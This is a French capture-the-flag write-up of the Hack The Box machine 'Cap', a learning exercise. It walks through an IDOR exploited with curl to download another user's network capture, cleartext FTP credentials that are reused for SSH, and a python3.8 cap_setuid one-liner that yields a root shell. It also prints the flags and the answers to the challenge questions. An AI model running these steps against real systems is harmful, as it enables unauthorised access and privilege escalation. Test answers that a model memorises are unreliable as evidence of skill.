[⬅ Retour à Machines](README.md) · [🏠 Accueil du repo](../../README.md)

# Machine 1 — Cap

**IDOR sur capture réseau (PCAP) + Linux capability `cap_setuid` — Easy / Linux**

| | |
|---|---|
| **OS** | Linux |
| **Difficulté** | Easy |
| **Points** | 20 |
| **Services** | FTP (21) · SSH (22) · HTTP / Gunicorn (80) |
| **Vulnérabilité principale** | IDOR → PCAP credentials + `cap_setuid` |

## Concept

Un dashboard web Flask/Gunicorn permet de lancer un *Security Snapshot* (capture réseau) et de le télécharger via un identifiant incrémental. Une IDOR (Insecure Direct Object Reference) permet d'accéder aux captures des autres utilisateurs, révélant des identifiants FTP en clair dans un PCAP. La privesc exploite une **Linux capability** (`cap_setuid`) posée sur l'interpréteur Python.

```mermaid
flowchart LR
    A["nmap -sC -sV"] --> B["Port 80 : dashboard web<br/>Security Snapshot"]
    B --> C["IDOR sur /data/&lt;id&gt;<br/>id = 0"]
    C --> D["Télécharge le PCAP<br/>d'un autre utilisateur"]
    D --> E["Wireshark : filtre ftp<br/>creds en clair"]
    E --> F["nathan : Buck3tH4TF0RM3!"]
    F --> G["SSH avec les mêmes creds<br/>réutilisation FTP → SSH"]
    G --> H["getcap -r /<br/>python3.8 = cap_setuid+eip"]
    H --> I["os.setuid(0)<br/>→ root"]
```



## Énumération

### Nmap

```bash
nmap -sC -sV 10.129.x.x
```

```
21/tcp open  ftp     vsftpd
22/tcp open  ssh     OpenSSH
80/tcp open  http    Gunicorn — "Security Dashboard"
```

Le FTP est fermé à l'accès anonyme — fausse piste, on se concentre sur l'application web.

### Dashboard web

Le site propose de lancer un **Security Snapshot** (capture réseau du trafic système). Une fois lancé, le navigateur est redirigé vers :

```
http://10.129.x.x/data/<id>
```

---

## Foothold — IDOR sur l'identifiant de capture

L'ID dans l'URL est incrémental et contrôlé côté client, sans vérification de propriétaire : c'est une IDOR classique. On teste l'ID le plus bas.

```bash
curl -s http://10.129.x.x/data/0
```

Cela renvoie la page de résultat du scan **d'un autre utilisateur**. On télécharge le PCAP correspondant :

```bash
curl -s http://10.129.x.x/data/0/download -o data_0.pcap
```

### Analyse du PCAP

```bash
wireshark data_0.pcap
```

Filtre Wireshark :

```
ftp.request.command == "USER" or ftp.request.command == "PASS"
```

Résultat : identifiants FTP transmis en clair.

```
USER nathan
PASS Buck3tH4TF0RM3!
```

### Réutilisation du mot de passe → SSH

Le mot de passe FTP est réutilisé pour SSH :

```bash
ssh nathan@10.129.x.x
# Password: Buck3tH4TF0RM3!
```

```bash
cat user.txt
# 61b0186a70164919f0be2de0139cc03f
```

---

## Privilege Escalation — Linux capability `cap_setuid`

### Découverte

`getcap` liste les capabilities POSIX accordées aux binaires — l'équivalent moderne (et plus granulaire) du bit SUID.

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

`python3.8` porte `cap_setuid+eip` : l'interpréteur peut changer son UID effectif vers n'importe quelle valeur, y compris 0 (root).

### Exploitation

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```bash
whoami
# root
cat /root/root.txt
# e7f342183e8016c7e5786586752b50d1
```

---

## Flags

| | |
|---|---|
| **User** | `61b0186a70164919f0be2de0139cc03f` |
| **Root** | `e7f342183e8016c7e5786586752b50d1` |

## Réponses aux questions HTB

| Question | Réponse |
|---|---|
| How many TCP ports are open? | **3** |
| Path format `/[something]/[id]` → *something* | **data** |
| Able to get other users' scans? | **yes** |
| ID of the PCAP with sensitive data | **0** |
| Application layer protocol with sensitive data | **ftp** |
| Other service where the password works | **ssh** |

## Points clés

- Une IDOR sur un identifiant de ressource incrémental (`/data/<id>`) permet souvent d'accéder aux données d'autres utilisateurs en changeant simplement le nombre — toujours tester `id=0`, `id-1`, etc.
- Les fichiers PCAP capturés par une application peuvent contenir des identifiants en clair pour des protocoles non chiffrés (FTP, HTTP, Telnet) — toujours les analyser avec Wireshark ou `tshark` après téléchargement.
- La réutilisation de mot de passe entre FTP et SSH pour un même utilisateur est une faille humaine très fréquente.
- Les **Linux capabilities** (`getcap -r /`) sont l'équivalent moderne du bit SUID, mais accordent des privilèges plus granulaires (`cap_setuid`, `cap_net_raw`...). `getcap -r /` doit être aussi systématique que `find / -perm -4000` en énumération de privesc.
- `cap_setuid+eip` sur un interpréteur (Python, Perl...) permet un changement d'UID direct vers 0 depuis un one-liner, sans exploit complexe.

## Leçon retenue

*Une simple IDOR sur un numéro d'identifiant, combinée à une capture réseau contenant des identifiants en clair et une capability Linux mal restreinte, suffit à obtenir un accès root complet. Les capabilities Linux méritent la même attention que les binaires SUID lors de toute énumération de privesc.*

---

[⬆ Index Machines](README.md) · [Suivant : Orion ➡](orion.md)
